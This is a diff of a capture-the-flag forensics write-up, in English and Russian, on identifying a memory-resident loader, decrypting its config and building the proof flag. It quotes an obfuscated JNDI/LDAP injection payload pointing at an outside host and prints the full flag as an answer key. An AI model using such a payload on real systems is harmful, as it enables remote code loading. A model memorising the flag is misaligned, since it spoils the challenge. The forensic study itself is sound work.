@@ -51,7 +51,7 @@ BurhanGuild-Loader-Incident/
     └── burhanguild_memory_rules.yar
 ```
 
-First thing — every file matches the manifest, so nothing is tampered:
+First thing I did was check every file against the manifest — nothing was tampered with:
 
 ```python
 import json, hashlib, pathlib
@@ -84,8 +84,8 @@ byte, and a big-endian size). The record *kinds* map onto those views:
 
 ## Step 1 — which capture is the *real* event?
 
-The whole point of the challenge is triage. Dump every view for every capture and
-line them up:
+The whole point here is triage, so I dumped every view for every capture and
+lined them up:
 
 ```bash
 for f in artifacts/captures/*.raw; do
@@ -107,7 +107,7 @@ but only some go further. Comparing them:
 | **A812**| **4787**                | **`rwxp memfd:libpam_bg.so`**    | **ESTABLISHED → `morrow-gate.wreckit.invalid:8443`** | **deleted `/dev/shm/.bg-cache/e0bafe9e.zip`** |
 | D044    | —                       | `r-xp memfd:libmetrics.so`       | ESTABLISHED → `mirror-36.invalid`    | — |
 
-The YARA rule tells you what the loader looks like:
+The YARA rule told me what the loader looks like:
 
 ```
 rule BurhanGuild_Memory_Loader {
@@ -124,9 +124,9 @@ rule BurhanGuild_Memory_Loader {
 C2 + a freshly-deleted `.bg-cache` archive **only all line up in `capture_A812.raw`**.
 The others are near-misses: read-only maps, a decoy `libmetrics.so`, loopback-only
 sockets, or a process that shows up in the environment table but not the process scan.
-`A812` is our event.
+So `A812` was my event.
 
-Everything we need is in that one capture:
+Everything I needed was in that one capture:
 
 ```
 BG_MUTEX     = bguild-ce104cb0                 # environment, pid 4787
@@ -141,7 +141,7 @@ jndi payload = ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://172.19.0.66:138
 ## Step 2 — pair it with the deleted page
 
 Four of the eight pages carry a small recovered ZIP (`case_fragment.json` +
-`transfer.log`). Carve them and read the metadata:
+`transfer.log`). I carved them and read the metadata:
 
 ```python
 import re, zipfile, io
@@ -183,8 +183,8 @@ then ciphertext) and the marker string `eir-v3`.
 
 ## Step 4 — reverse the crypto
 
-`objdump` refuses (`can't disassemble for architecture UNKNOWN` on the carved region),
-so disassemble the `.text` with capstone. Two routines matter.
+`objdump` refused (`can't disassemble for architecture UNKNOWN` on the carved region),
+so I disassembled the `.text` with capstone. Two routines mattered.
 
 **Key schedule** (`0x1100`): a little sponge over four inputs, seeded with the digits of
 π (`0x243f6a88 0x85a308d3 0x13198a2e 0x03707344`) and stepped with the golden-ratio
@@ -203,8 +203,8 @@ BG_MUTEX  ("bguild-ce104cb0")  +  heap8 (a01fb1f61e9116a6)  +  build_id (10 byte
 ```
 
 Decrypting the `CFG3` blob yields JSON, and it self-checks: the plaintext contains a
-`crc32` field equal to the CRC32 of the plaintext-minus-that-field — so you *know* the
-key is right:
+`crc32` field equal to the CRC32 of the plaintext-minus-that-field — so I *knew* the
+key was right:
 
 ```json
 {
@@ -228,8 +228,8 @@ key is right:
 
 ## Step 5 — build the proof token
 
-The config hands you the recipe. `digest` is sha256 over the pipe-joined fields, the
-first of which is the **normalized** JNDI string (resolve every `${lower:x}` → `x`):
+The config handed me the recipe. `digest` is sha256 over the pipe-joined fields, the
+first of which is the **normalized** JNDI string (I resolve every `${lower:x}` → `x`):
 
 ```
 jndi_normalized = ${jndi:ldap://172.19.0.66:1389/BurhanGuild}
@@ -246,7 +246,7 @@ config_sha256 = sha256(decrypted CFG3 plaintext)
               = 360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b
 ```
 
-Plug the fields into `token_schema`:
+I plugged the fields into `token_schema`:
 
 ```
 BGLPROOF{orion-lab__cap-A812__loader-4787__implant-BG-94C2A04EC6__build-542715c2e46252e4d790__config-360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b__archive-4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a__digest-836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed}
@@ -276,13 +276,14 @@ python3 scripts/solve.py path/to/BurhanGuild-Loader-Incident
 [FLAG] BGLPROOF{orion-lab__cap-A812__...__digest-836d4fce...}
 ```
 
-## Notes / rabbit holes
+## What I ignored, and what gave it away
 
 - The `supply` view (xz/liblzma `CVE-2024-3094`) and the `collector.chunk` write
-  handles are flavor — every capture has them, so they can't be the discriminator.
-- `libmetrics.so` vs `libpam_bg.so` is the cleanest tell for a decoy capture.
+  handles are flavour — every capture has them, so I knew they couldn't be the
+  discriminator.
+- `libmetrics.so` vs `libpam_bg.so` was the cleanest tell for a decoy capture.
 - `config_sha256` is the sha256 of the **decrypted config bytes**; the `crc32` field
-  inside the config is only there to confirm your key schedule is correct.
+  inside the config is only there to confirm the key schedule is correct.
 
 ---
 
@@ -340,7 +341,7 @@ BurhanGuild-Loader-Incident/
     └── burhanguild_memory_rules.yar
 ```
 
-Первым делом — всё сходится с манифестом, значит ничего не подменено:
+Первым делом я сверил всё с манифестом — ничего не подменено:
 
 ```python
 import json, hashlib, pathlib
@@ -374,8 +375,8 @@ big-endian размер). Типы записей (`kind`) соответств�
 
 ## Шаг 1 — какой снимок относится к *реальному* событию?
 
-Весь смысл задания — в триаже. Выгружаем все представления по каждому снимку и
-сравниваем:
+Весь смысл задания — в триаже, поэтому я выгрузил все представления по каждому
+снимку и сравнил:
 
 ```bash
 for f in artifacts/captures/*.raw; do
@@ -397,7 +398,7 @@ done
 | **A812**| **4787**                   | **`rwxp memfd:libpam_bg.so`**    | **ESTABLISHED → `morrow-gate.wreckit.invalid:8443`** | **удалён `/dev/shm/.bg-cache/e0bafe9e.zip`** |
 | D044   | —                           | `r-xp memfd:libmetrics.so`       | ESTABLISHED → `mirror-36.invalid`      | — |
 
-YARA-правило подсказывает, как выглядит загрузчик:
+YARA-правило подсказало мне, как выглядит загрузчик:
 
 ```
 rule BurhanGuild_Memory_Loader {
@@ -414,9 +415,9 @@ rule BurhanGuild_Memory_Loader {
 + только что удалённый архив `.bg-cache` — всё это сходится **только в `capture_A812.raw`**.
 Остальные — почти-совпадения: read-only маппинги, подставной `libmetrics.so`,
 loopback-only сокеты или процесс, который есть в таблице окружения, но не в скане
-процессов. `A812` — наше событие.
+процессов. Значит, `A812` — моё событие.
 
-Всё нужное — в этом одном снимке:
+Всё нужное оказалось в этом одном снимке:
 
 ```
 BG_MUTEX     = bguild-ce104cb0                 # environment, pid 4787
@@ -431,7 +432,7 @@ jndi payload = ${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://172.19.0.66:138
 ## Шаг 2 — спарить снимок с удалённой страницей
 
 Четыре из восьми страниц несут маленький восстановленный ZIP (`case_fragment.json` +
-`transfer.log`). Вырезаем и читаем метаданные:
+`transfer.log`). Я вырезал их и прочитал метаданные:
 
 ```python
 import re, zipfile, io
@@ -473,8 +474,8 @@ file loader.so   # ELF 64-bit LSB shared object, x86-64, stripped
 
 ## Шаг 4 — реверс крипты
 
-`objdump` отказывается (`can't disassemble for architecture UNKNOWN` на вырезанном
-регионе), поэтому дизассемблируем `.text` через capstone. Важны две функции.
+`objdump` отказался (`can't disassemble for architecture UNKNOWN` на вырезанном
+регионе), поэтому я дизассемблировал `.text` через capstone. Важны две функции.
 
 **Формирование ключа** (`0x1100`): небольшая «губка» по четырём входам, инициализируется
 цифрами π (`0x243f6a88 0x85a308d3 0x13198a2e 0x03707344`) и продвигается константой
@@ -493,7 +494,7 @@ BG_MUTEX  ("bguild-ce104cb0")  +  heap8 (a01fb1f61e9116a6)  +  build_id (10 ба
 ```
 
 Расшифровка блоба `CFG3` даёт JSON, и он сам себя проверяет: внутри есть поле `crc32`,
-равное CRC32 от plaintext-а без этого поля — так что ты *знаешь*, что ключ верный:
+равное CRC32 от plaintext-а без этого поля — так что я *знал*, что ключ верный:
 
 ```json
 {
@@ -517,8 +518,8 @@ BG_MUTEX  ("bguild-ce104cb0")  +  heap8 (a01fb1f61e9116a6)  +  build_id (10 ба
 
 ## Шаг 5 — собрать proof token
 
-Конфиг сам выдаёт рецепт. `digest` — это sha256 от полей, склеенных через `|`, первое из
-которых — **нормализованная** строка JNDI (раскрыть все `${lower:x}` → `x`):
+Конфиг сам выдал мне рецепт. `digest` — это sha256 от полей, склеенных через `|`, первое
+из которых — **нормализованная** строка JNDI (я раскрываю все `${lower:x}` → `x`):
 
 ```
 jndi_normalized = ${jndi:ldap://172.19.0.66:1389/BurhanGuild}
@@ -535,7 +536,7 @@ config_sha256 = sha256(расшифрованный plaintext CFG3)
               = 360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b
 ```
 
-Подставляем поля в `token_schema`:
+Я подставил поля в `token_schema`:
 
 ```
 BGLPROOF{orion-lab__cap-A812__loader-4787__implant-BG-94C2A04EC6__build-542715c2e46252e4d790__config-360251a5def08d12cb71e72d5a1609b0d34c9dfc9520197ad8b0cc2cd7cfb76b__archive-4bd20e26a2e63e75af61b07af3cf5dc219ca11a018588a3ce0ee4564338cf64a__digest-836d4fce93ec7b3077ab7c97820d29515ea5609cf346e40b76973ca37e2418ed}
@@ -565,11 +566,12 @@ python3 scripts/solve.py challenge/BurhanGuild-Loader-Incident
 [FLAG] BGLPROOF{orion-lab__cap-A812__...__digest-836d4fce...}
 ```
 
-## Заметки / тупики
+## Что я отбросил и что меня навело
 
 - Представление `supply` (xz/liblzma `CVE-2024-3094`) и файловые хэндлы
-  `collector.chunk` — это «мясо для антуража»: они есть у каждого снимка, различить по
-  ним нельзя.
-- `libmetrics.so` против `libpam_bg.so` — самый чистый признак подставного снимка.
+  `collector.chunk` — это антураж: они есть у каждого снимка, поэтому я понимал, что
+  различить по ним нельзя.
+- `libmetrics.so` против `libpam_bg.so` был для меня самым чистым признаком подставного
+  снимка.
 - `config_sha256` — это sha256 **расшифрованных байтов конфига**; поле `crc32` внутри
   конфига нужно лишь чтобы подтвердить, что ключ подобран верно.
